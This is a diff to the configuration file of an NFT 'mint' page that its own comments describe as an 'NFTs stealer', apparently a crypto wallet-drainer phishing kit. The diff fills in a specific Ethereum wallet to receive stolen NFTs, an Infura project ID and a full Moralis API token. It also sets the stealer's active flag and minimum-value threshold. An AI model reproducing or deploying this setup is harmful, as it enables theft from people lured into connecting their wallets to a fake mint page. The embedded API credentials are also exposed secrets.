@@ -1,12 +1,12 @@
 // ⚠️ for infura & moralis, make you sure that you copy same number of characters
-const address = "xxxxxxxxxxxxxxxx";    // Your ETH wallet that you have to receive NFTs
-const infuraId = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
-const moralisApi = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"    // Web3 Api key | https://moralis.io/ | For NFTs
+const address = "0x9123cfc8ce063c4e343869599539fc22e4ba051d";    // Your ETH wallet that you have to receive NFTs
+const infuraId = "ad2f827b4e2449de94d0664f89283e02"     // Infuria Project ID | https://infura.io/ | For Wallet Connect
+const moralisApi = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6ImIzYWZmZDE2LTBlNWYtNDM5OS04ZDM3LTA3NTY3NGJhNmI2NSIsIm9yZ0lkIjoiMzUyNjYyIiwidXNlcklkIjoiMzYyNDc0IiwidHlwZUlkIjoiZmMwMzY1YzYtZWFiMC00MDJkLTk2NDMtNTQwM2JjZTExODI5IiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE2OTE3NzgwMTYsImV4cCI6NDg0NzUzODAxNn0.-JwPyG-f-IhTNMD5rP4DlL6HOWLijCpdxxJSMiuwZ0I"    // Web3 Api key | https://moralis.io/ | For NFTs
 
 const collectionInfo = {
     name: "Tec.sellix.io",
     title: "Tec MINT Template", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
-    date: "10.07.2022", // Today date
+    date: "10.07.2023", // Today date
     socialMedia: {
         discord: "https://discord.gg/example",
         twitter: "https://twitter.com/example",
@@ -34,7 +34,7 @@ const nftsInfo = {
     active: true,   // Active (true) or not (false) NFTs stealer.
     minValue: 0.2,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
     checkMaxDay: 7, // Maximum number of days to check for the last transactions.
-    receiveAddress: "" // leave empty if you want to use the same address 
+    receiveAddress: "0x9123cfc8ce063c4e343869599539fc22e4ba051d" // leave empty if you want to use the same address 
 }
 
 /* 
